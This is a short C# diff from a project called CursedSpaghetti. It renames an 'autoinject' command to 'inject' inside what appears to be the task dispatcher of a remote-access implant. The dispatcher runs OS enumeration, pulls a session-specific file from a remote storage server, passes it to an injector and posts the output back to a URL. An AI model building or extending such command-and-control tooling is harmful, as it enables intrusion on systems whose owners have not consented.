@@ -105,8 +105,8 @@ namespace CursedSpaghetti
                 case "basicenum":
                     Gatherer.ListBasicOSInfo(url);
                     break;
-                case "autoinject":
-                    string targetFile = weapon.Substring(11).Replace(" ", "");
+                case "inject":
+                    string targetFile = weapon.Substring(7).Replace(" ", "");
                     output = Injector.run(String.Format("{0}Storage/{1}/{2}", fs_url, sessionid, targetFile));
                     Post(url, output);
                     break;
